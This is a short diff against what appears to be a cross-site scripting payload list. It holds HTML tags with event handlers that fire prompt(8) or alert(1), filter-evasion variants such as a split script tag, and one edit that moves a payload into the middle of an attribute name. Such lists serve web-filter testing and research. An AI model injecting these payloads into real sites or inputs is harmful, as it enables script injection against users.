@@ -9,7 +9,7 @@
 <image/src/onerror=prompt(8)>
 <img/src/onerror=prompt(8)>
 <image src/onerror=prompt(8)>
-<img src/onerror=prompt(8)>
+
 <image src =q onerror=prompt(8)>
 <img src =q onerror=prompt(8)>
 </scrip</script>t><img src =q onerror=prompt(8)>
@@ -28,7 +28,7 @@
 <x oncut=alert(1)>copy this! 
 <x ondblclick=alert(1)>double click this! 
 <x ondrag=alert(1)>drag this! 
-<x contenteditable onfocus=alert(1)>focus this! 
+<x conte<img src/onerror=prompt(8)>nteditable onfocus=alert(1)>focus this! 
 <x contenteditable oninput=alert(1)>input here! 
 <x contenteditable onkeydown=alert(1)>press any key! 
 <x contenteditable onkeypress=alert(1)>press any key! 
